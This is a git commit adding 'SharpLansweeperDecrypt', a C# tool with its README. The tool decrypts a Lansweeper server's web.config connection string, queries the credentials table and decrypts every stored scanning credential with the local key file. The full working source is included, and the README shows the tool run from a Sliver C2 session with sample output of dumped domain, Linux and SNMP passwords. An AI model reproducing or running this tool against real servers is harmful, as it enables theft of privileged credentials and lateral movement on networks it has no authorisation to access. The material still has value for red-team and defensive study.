1368e982b2891c74723c3d0cba092ddad93e4b82
Yeeb1 <47221467+Yeeb1@users.noreply.github.com>
2024-03-01 16:57:25 +0000

    inital commit

--- README.md
+++ README.md
@@ -1,1 +1,103 @@
 # SharpLansweeperDecrypt
+
+`SharpLansweeperDecrypt` is designed to automatically extract and decrypt all configured scanning credentials of a [Lansweeper](https://www.lansweeper.com) instance, provided there is local access to the server.
+
+For manual decryption, the tool is capable of decrypting passwords when supplied with both the encrypted password and the encryption key (`C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`).
+
+
+1. Automatically identifies and decrypts the database connection strings contained within Lansweeper's `web.config` file.
+2. Utilizes the decrypted connection strings to query the Lansweeper SQL database, retrieving all configured `Scanning Credentials`.
+3. Locates the `Encryption.txt` file on the disk, which Lansweeper uses for credential encryption.
+4. Applies the encryption key to decrypt and display the scanning credentials.
+
+## Usage
+```
+PS C:\Users\Yeeb\Downloads> .\SharpLansweeperDecrypt.exe -h
+╔═╗┬ ┬┌─┐┬─┐┌─┐╦  ┌─┐┌┐┌┌─┐┬ ┬┌─┐┌─┐┌─┐┌─┐┬─┐╔╦╗┌─┐┌─┐┬─┐┬ ┬┌─┐┌┬┐
+╚═╗├─┤├─┤├┬┘├─┘║  ├─┤│││└─┐│││├┤ ├┤ ├─┘├┤ ├┬┘ ║║├┤ │  ├┬┘└┬┘├─┘ │
+╚═╝┴ ┴┴ ┴┴└─┴  ╩═╝┴ ┴┘└┘└─┘└┴┘└─┘└─┘┴  └─┘┴└─═╩╝└─┘└─┘┴└─ ┴ ┴   ┴
+
+Usage:
+  No arguments: Runs the program as is, decrypting web.config and connecting to the SQL database.
+  -p <path>: Optional path to the encryption key. If not provided, a default path is used.
+  -e <encryptedPassword>: Decrypts the provided encrypted password without decrypting web.config or connecting to the SQL database.
+```
+
+### Automatic Decryption
+
+With no arguments specified the tool will try to automaicautomatically dump and decrypt all configured `Scanning Credentials`
+
+```
+sliver (maldev) > inline-execute-assembly tool/SharpLansweeperDecrypt.exe -
+
+[*] Successfully executed inline-execute-assembly (coff-loader)
+[*] Got output:
+[+] Success - Wrote 12298 bytes to memory
+
+╔═╗┬ ┬┌─┐┬─┐┌─┐╦  ┌─┐┌┐┌┌─┐┬ ┬┌─┐┌─┐┌─┐┌─┐┬─┐╔╦╗┌─┐┌─┐┬─┐┬ ┬┌─┐┌┬┐
+╚═╗├─┤├─┤├┬┘├─┘║  ├─┤│││└─┐│││├┤ ├┤ ├─┘├┤ ├┬┘ ║║├┤ │  ├┬┘└┬┘├─┘ │
+╚═╝┴ ┴┴ ┴┴└─┴  ╩═╝┴ ┴┘└┘└─┘└┴┘└─┘└─┘┴  └─┘┴└─═╩╝└─┘└─┘┴└─ ┴ ┴   ┴
+
+[+] Loading web.config file...
+[+] Decrypted connectionStrings section:
+Using connectionString: Data Source=(localdb)\.\LSInstance;Initial Catalog=lansweeperdb;Integrated Security=False;User ID=lansweeperuser;Password=InfiniteVoid*GetoSuguru;Connect Timeout=10;Application Name="LsService Core .Net SqlClient Data Provider"
+[+] Opening connection to the database...
+[+] Retrieving credentials from the database...
+[+] Credential decrypted successully
+┌───────────────────────────────────────┐
+│ Credential: SNMP-Private              │
+│ Username:   SNMP Community String     │
+│ Password:   private                   │
+└───────────────────────────────────────┘
+[+] Credential decrypted successully
+┌───────────────────────────────────────┐
+│ Credential: Global SNMP               │
+│ Username:                             │
+│ Password:   public                    │
+└───────────────────────────────────────┘
+[+] Credential decrypted successully
+┌───────────────────────────────────────┐
+│ Credential: Inventory Windows         │
+│ Username:   SWEEP\svc_inventory_win   │
+│ Password:   CursedEnergy$Itadori$     │
+└───────────────────────────────────────┘
+[+] Credential decrypted successully
+┌───────────────────────────────────────┐
+│ Credential: Inventory Linux           │
+│ Username:   svc_inventory_lnx         │
+│ Password:   CurseExorcist#Gojo!       │
+└───────────────────────────────────────┘
+[+] Database connection closed.
+
+[+] inlineExecute-Assembly Finished
+```
+### Manual Decryption
+Sould the `web.config` file be undecryptable or access to the SQL service be unavailable, `SharpLansweeperDecrypt` offers a manual decryption option using the `-e` flag. In cases where the encryption key's path is not explicitly provided with the `-p` flag, the tool defaults to using `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`.
+
+```PS C:\Users\Yeeb\Downloads> .\SharpLansweeperDecrypt.exe -e 'fuVE63qSVMPbuSnYUdUE+MuRpn8t/PXyLnMUb4gfDew='
+╔═╗┬ ┬┌─┐┬─┐┌─┐╦  ┌─┐┌┐┌┌─┐┬ ┬┌─┐┌─┐┌─┐┌─┐┬─┐╔╦╗┌─┐┌─┐┬─┐┬ ┬┌─┐┌┬┐
+╚═╗├─┤├─┤├┬┘├─┘║  ├─┤│││└─┐│││├┤ ├┤ ├─┘├┤ ├┬┘ ║║├┤ │  ├┬┘└┬┘├─┘ │
+╚═╝┴ ┴┴ ┴┴└─┴  ╩═╝┴ ┴┘└┘└─┘└┴┘└─┘└─┘┴  └─┘┴└─═╩╝└─┘└─┘┴└─ ┴ ┴   ┴
+
+Decrypted Password: ForbiddenTechnique#DomainExpansion
+```
+
+### Powershell
+In addition to the C# version, this repository also includes a PowerShell script, `LansweeperDecrypt.ps1`, which automates the process of dumping and decrypting Lansweeper credentials. 
+
+## Compilation
+Ensure your C# development environment (e.g., .NET SDK, Visual Studio) is set up correctly. The project requires the `System.Configuration.ConfigurationManager`.
+
+```sh
+dotnet add package System.Configuration.ConfigurationManager
+```
+
+Alternatively, if you're using Visual Studio, you can manage NuGet packages for your project and add `System.Configuration.ConfigurationManager` from there.
+
+## Acknowledgments
+
+Special thanks to the [LansweeperPasswordRecovery](https://github.com/GoSecure/LansweeperPasswordRecovery) repository for providing guidance on how to decrypt Lansweeper Scanning Credentials.
+
+---
+
+*The script is for informational and educational purposes only. The author and contributors of this script are not responsible for any misuse or damage caused by this tool.* <!-- meme -->
---
+++ SharpLansweeperDecrypt/SharpLansweeperDecrypt/Program.cs
@@ -0,0 +1,175 @@
+﻿using System;
+using System.Data.SqlClient;
+using System.IO;
+using System.Security.Cryptography;
+using System.Configuration;
+using System.Linq;
+
+namespace SharpLansweeperDecrypt
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("╔═╗┬ ┬┌─┐┬─┐┌─┐╦  ┌─┐┌┐┌┌─┐┬ ┬┌─┐┌─┐┌─┐┌─┐┬─┐╔╦╗┌─┐┌─┐┬─┐┬ ┬┌─┐┌┬┐");
+            Console.WriteLine("╚═╗├─┤├─┤├┬┘├─┘║  ├─┤│││└─┐│││├┤ ├┤ ├─┘├┤ ├┬┘ ║║├┤ │  ├┬┘└┬┘├─┘ │ ");
+            Console.WriteLine("╚═╝┴ ┴┴ ┴┴└─┴  ╩═╝┴ ┴┘└┘└─┘└┴┘└─┘└─┘┴  └─┘┴└─═╩╝└─┘└─┘┴└─ ┴ ┴   ┴ ");
+            Console.WriteLine();
+
+            string encryptionKeyPath = @"C:\Program Files (x86)\Lansweeper\Key\Encryption.txt";
+            string encryptedPassword = null;
+
+            if (args.Contains("-h") || args.Contains("--help"))
+            {
+                Console.WriteLine("Usage:");
+                Console.WriteLine("  No arguments: Runs the program as is, decrypting web.config and connecting to the SQL database.");
+                Console.WriteLine("  -p <path>: Optional path to the encryption key. If not provided, a default path is used.");
+                Console.WriteLine("  -e <encryptedPassword>: Decrypts the provided encrypted password without decrypting web.config or connecting to the SQL database.");
+                return;
+            }
+
+            int pathIndex = Array.IndexOf(args, "-p");
+            if (pathIndex != -1 && args.Length > pathIndex + 1)
+            {
+                encryptionKeyPath = args[pathIndex + 1];
+                if (!File.Exists(encryptionKeyPath))
+                {
+                    Console.WriteLine("[ERROR] The specified encryption key file was not found.");
+                    return;
+                }
+            }
+
+            int passwordIndex = Array.IndexOf(args, "-e");
+            if (passwordIndex != -1 && args.Length > passwordIndex + 1)
+            {
+                encryptedPassword = args[passwordIndex + 1];
+            }
+
+            if (!string.IsNullOrEmpty(encryptedPassword))
+            {
+                string decryptedPassword = DecryptPassword(File.ReadAllBytes(encryptionKeyPath), encryptedPassword);
+                Console.WriteLine("Decrypted Password: " + decryptedPassword);
+                return;
+            }
+
+            Console.WriteLine("[+] Loading web.config file...");
+            var configMap = new ExeConfigurationFileMap { ExeConfigFilename = @"C:\Program Files (x86)\Lansweeper\Website\web.config" };
+            Configuration config = ConfigurationManager.OpenMappedExeConfiguration(configMap, ConfigurationUserLevel.None);
+            ConnectionStringsSection section = config.GetSection("connectionStrings") as ConnectionStringsSection;
+
+            if (section != null && section.SectionInformation.IsProtected)
+            {
+                section.SectionInformation.UnprotectSection();
+                Console.WriteLine("[+] Decrypted connectionStrings section:");
+
+                string connectionString = null;
+
+                foreach (ConnectionStringSettings css in section.ConnectionStrings)
+                {
+                    if (css.Name == "lansweeper")
+                    {
+                        connectionString = css.ConnectionString;
+                        break;
+                    }
+                }
+
+                if (!string.IsNullOrEmpty(connectionString))
+                {
+                    Console.WriteLine("Using connectionString: " + connectionString);
+                    try
+                    {
+                        using (var connection = new SqlConnection(connectionString))
+                        {
+                            connection.Open();
+                            Console.WriteLine("[+] Opening connection to the database...");
+
+                            var query = "SELECT credname, username, password FROM lansweeperdb.dbo.tsysCredentials";
+                            var command = new SqlCommand(query, connection);
+
+                            Console.WriteLine("[+] Retrieving credentials from the database...");
+                            using (var reader = command.ExecuteReader())
+                            {
+                                while (reader.Read())
+                                {
+                                    var credname = reader["credname"].ToString();
+                                    var username = reader["username"].ToString();
+                                    var dbEncryptedPassword = reader["password"].ToString();
+                                    if (!string.IsNullOrWhiteSpace(dbEncryptedPassword))
+                                    {
+                                        var decryptedPassword = DecryptPassword(File.ReadAllBytes(encryptionKeyPath), dbEncryptedPassword);
+                                        Console.WriteLine("[+] Credential decrypted successully");
+                                        Console.WriteLine("┌───────────────────────────────────────┐");
+                                        Console.WriteLine($"│ Credential: {credname.PadRight(26)}│");
+                                        Console.WriteLine($"│ Username:   {username.PadRight(26)}│");
+                                        Console.WriteLine($"│ Password:   {decryptedPassword.PadRight(26)}│");
+                                        Console.WriteLine("└───────────────────────────────────────┘");
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"[ERROR] An error occurred while processing the database: {ex.Message}. Database connection failed, please access and decrypt credentials manually with the -e flag.");
+                    }
+                    finally
+                    {
+                        Console.WriteLine("[+] Database connection closed.");
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("[ERROR] Specific connection string 'lansweeper' was not found.");
+                }
+            }
+            else
+            {
+                Console.WriteLine("[ERROR] The connectionStrings section is either not encrypted or not found.");
+            }
+        }
+
+        static string DecryptPassword(byte[] key, string cipherText)
+        {
+            try
+            {
+                byte[] Salt = new byte[] { 39, 15, 41, 17, 43, 19, 45, 21 };
+                int Iter = 10000;
+                int AESKeySize = 16;
+                using (var pbkdf2 = new Rfc2898DeriveBytes(key, Salt, Iter))
+                {
+                    byte[] AESKey = pbkdf2.GetBytes(AESKeySize);
+                    byte[] cipherBytes = Convert.FromBase64String(cipherText);
+                    byte[] iv = new byte[16];
+                    Array.Copy(cipherBytes, 0, iv, 0, iv.Length);
+                    byte[] cipher = new byte[cipherBytes.Length - iv.Length];
+                    Array.Copy(cipherBytes, iv.Length, cipher, 0, cipher.Length);
+
+                    using (Aes aes = Aes.Create())
+                    {
+                        aes.Key = AESKey;
+                        aes.IV = iv;
+                        aes.Padding = PaddingMode.PKCS7;
+                        using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
+                        {
+                            using (var ms = new MemoryStream(cipher))
+                            {
+                                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
+                                {
+                                    using (var sr = new StreamReader(cs))
+                                    {
+                                        return sr.ReadToEnd();
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[ERROR] An error occurred during password decryption: {ex.Message}");
+                return null;
+            }
+        }
+    }
+}
